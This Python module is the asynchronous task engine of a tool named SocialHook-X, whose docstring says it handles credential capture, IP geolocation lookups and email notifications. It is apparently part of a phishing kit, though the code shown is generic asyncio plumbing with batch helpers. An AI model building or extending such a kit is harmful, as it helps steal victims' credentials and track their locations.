"""
SocialHook-X - Asynchronous Engine Module

Provides high-performance asynchronous task execution for credential capture,
geolocation lookups, and email notifications.
"""

import asyncio
import logging
import threading
from typing import Callable, Any, List, Optional, Dict
from dataclasses import dataclass
from datetime import datetime

logger = logging.getLogger(__name__)


@dataclass
class AsyncTask:
    """Represents an asynchronous task"""
    task_id: str
    name: str
    callback: Callable
    args: tuple = ()
    kwargs: dict = None
    created_at: datetime = None
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    status: str = "pending"  # pending, running, completed, failed
    result: Any = None
    error: Optional[str] = None

    def __post_init__(self):
        if self.kwargs is None:
            self.kwargs = {}
        if self.created_at is None:
            self.created_at = datetime.now()


class AsyncEngine:
    """High-performance asynchronous task engine"""
    
    def __init__(self, max_concurrent_tasks: int = 100):
        """Initialize async engine
        
        Args:
            max_concurrent_tasks: Maximum concurrent tasks (default: 100)
        """
        self.max_concurrent_tasks = max_concurrent_tasks
        self.semaphore = asyncio.Semaphore(max_concurrent_tasks)
        self.tasks: Dict[str, AsyncTask] = {}
        self.task_lock = threading.Lock()
        self.event_loop: Optional[asyncio.AbstractEventLoop] = None
        self.running = False
    
    async def _bounded_task(self, task: AsyncTask) -> None:
        """Execute task with semaphore bounds"""
        async with self.semaphore:
            try:
                with self.task_lock:
                    task.status = "running"
                    task.started_at = datetime.now()
                logger.info(f"Starting async task: {task.name} (ID: {task.task_id})")
                
                # Execute task
                if asyncio.iscoroutinefunction(task.callback):
                    result = await task.callback(*task.args, **task.kwargs)
                else:
                    # Run sync callbacks in a worker thread to avoid blocking the event loop.
                    result = await asyncio.to_thread(task.callback, *task.args, **task.kwargs)

                if asyncio.iscoroutine(result):
                    result = await result

                with self.task_lock:
                    task.result = result
                    task.status = "completed"
                    task.completed_at = datetime.now()
                
                duration = (task.completed_at - task.started_at).total_seconds()
                logger.info(f"Completed async task: {task.name} ({duration:.2f}s)")
            
            except Exception as e:
                with self.task_lock:
                    task.status = "failed"
                    task.error = str(e)
                    task.completed_at = datetime.now()
                logger.error(f"Failed async task {task.name}: {e}")
    
    async def submit_async(self, task: AsyncTask) -> str:
        """Submit an async task
        
        Args:
            task: AsyncTask to execute
        
        Returns:
            Task ID
        """
        with self.task_lock:
            self.tasks[task.task_id] = task
        asyncio.create_task(self._bounded_task(task))
        return task.task_id
    
    async def batch_submit(self, tasks: List[AsyncTask]) -> List[str]:
        """Submit multiple async tasks
        
        Args:
            tasks: List of AsyncTask objects
        
        Returns:
            List of task IDs
        """
        task_ids = []
        for task in tasks:
            task_ids.append(await self.submit_async(task))
        return task_ids
    
    async def wait_all(self, timeout: Optional[float] = None) -> Dict[str, AsyncTask]:
        """Wait for all tasks to complete
        
        Args:
            timeout: Timeout in seconds
        
        Returns:
            Dictionary of completed tasks
        """
        try:
            with self.task_lock:
                task_ids = list(self.tasks.keys())
            pending_tasks = [
                asyncio.create_task(self._wait_for_task(task_id))
                for task_id in task_ids
            ]
            
            if pending_tasks:
                await asyncio.wait_for(
                    asyncio.gather(*pending_tasks),
                    timeout=timeout
                )
        except asyncio.TimeoutError:
            logger.warning(f"Task timeout after {timeout} seconds")
        
        return self.tasks
    
    async def _wait_for_task(self, task_id: str) -> None:
        """Wait for specific task to complete"""
        while True:
            with self.task_lock:
                if task_id not in self.tasks:
                    break
                if self.tasks[task_id].status in ["completed", "failed"]:
                    break
            await asyncio.sleep(0.1)
    
    def get_task_status(self, task_id: str) -> Optional[Dict]:
        """Get task status
        
        Args:
            task_id: Task ID
        
        Returns:
            Task status dictionary
        """
        with self.task_lock:
            if task_id not in self.tasks:
                return None
            
            task = self.tasks[task_id]
            return {
            "task_id": task.task_id,
            "name": task.name,
            "status": task.status,
            "result": task.result,
            "error": task.error,
            "created_at": task.created_at.isoformat() if task.created_at else None,
            "started_at": task.started_at.isoformat() if task.started_at else None,
            "completed_at": task.completed_at.isoformat() if task.completed_at else None
        }
    
    def get_stats(self) -> Dict[str, int]:
        """Get engine statistics
        
        Returns:
            Statistics dictionary
        """
        with self.task_lock:
            completed = sum(1 for t in self.tasks.values() if t.status == "completed")
            failed = sum(1 for t in self.tasks.values() if t.status == "failed")
            running = sum(1 for t in self.tasks.values() if t.status == "running")
            pending = sum(1 for t in self.tasks.values() if t.status == "pending")
            total_tasks = len(self.tasks)
        
        return {
            "total_tasks": total_tasks,
            "completed": completed,
            "failed": failed,
            "running": running,
            "pending": pending,
            "max_concurrent": self.max_concurrent_tasks
        }
    
    def clear_completed(self) -> int:
        """Clear completed tasks from memory
        
        Returns:
            Number of tasks cleared
        """
        with self.task_lock:
            task_ids_to_remove = [
                task_id for task_id, task in self.tasks.items()
                if task.status in ["completed", "failed"]
            ]
            
            for task_id in task_ids_to_remove:
                del self.tasks[task_id]
        
        count = len(task_ids_to_remove)
        
        logger.info(f"Cleared {count} completed tasks")
        return count


# Global async engine instance
_async_engine = None


def get_async_engine(max_concurrent: int = 100) -> AsyncEngine:
    """Get or create async engine instance
    
    Args:
        max_concurrent: Maximum concurrent tasks
    
    Returns:
        AsyncEngine instance
    """
    global _async_engine
    if _async_engine is None:
        _async_engine = AsyncEngine(max_concurrent_tasks=max_concurrent)
    return _async_engine


async def run_async_task(callback: Callable, *args, **kwargs) -> Any:
    """Run async task
    
    Args:
        callback: Callback function
        *args: Positional arguments
        **kwargs: Keyword arguments
    
    Returns:
        Task result
    """
    if asyncio.iscoroutinefunction(callback):
        return await callback(*args, **kwargs)
    
    result = await asyncio.to_thread(callback, *args, **kwargs)
    if asyncio.iscoroutine(result):
        return await result
    return result


async def batch_geolocation_lookup(ip_list: List[str], geo_tracker) -> List[Dict]:
    """Batch geolocation lookups using async
    
    Args:
        ip_list: List of IP addresses
        geo_tracker: GeoLocationTracker instance
    
    Returns:
        List of geolocation results
    """
    tasks = [
        asyncio.create_task(run_async_task(geo_tracker.get_location, ip))
        for ip in ip_list
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results


async def batch_send_notifications(notifications: List[Dict], notifier) -> List[Dict]:
    """Batch send notifications using async
    
    Args:
        notifications: List of notification dictionaries
        notifier: Notifier instance
    
    Returns:
        List of send results
    """
    tasks = [
        asyncio.create_task(
            run_async_task(
                notifier.notify_credential,
                notification.get("email"),
                notification.get("subject"),
                notification.get("body")
            )
        )
        for notification in notifications
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results
